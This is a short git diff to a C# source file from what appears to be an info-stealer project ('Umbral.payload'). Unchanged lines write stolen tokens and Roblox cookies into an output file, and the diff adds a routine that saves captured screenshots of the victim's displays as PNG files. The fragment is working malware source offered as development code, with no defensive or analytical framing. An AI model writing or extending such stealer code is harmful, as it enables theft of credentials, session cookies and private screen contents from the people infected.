@@ -1,4 +1,7 @@
-﻿using System.IO;
+﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
 using Umbral.payload.Browsers;
@@ -118,6 +121,23 @@ Token: {token}
                         foreach (var cookie in robloxCookies) await sw.WriteLineAsync($"{Delimeter}\n\n{cookie}\n\n");
                     }
                 }
+        }
+
+        internal static void SaveToFile(Bitmap[] screenshots, string folderPath)
+        {
+            for (int i = 0; i < screenshots.Length; i++)
+            {
+                try
+                {
+                    string filePath = Path.Combine(folderPath,
+                        "Display" + (screenshots.Length > 1 ? $"-{i+1}" : string.Empty) + ".png");
+                    screenshots[i].Save(filePath, ImageFormat.Png);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e);
+                }
+            }
         }
     }
 }
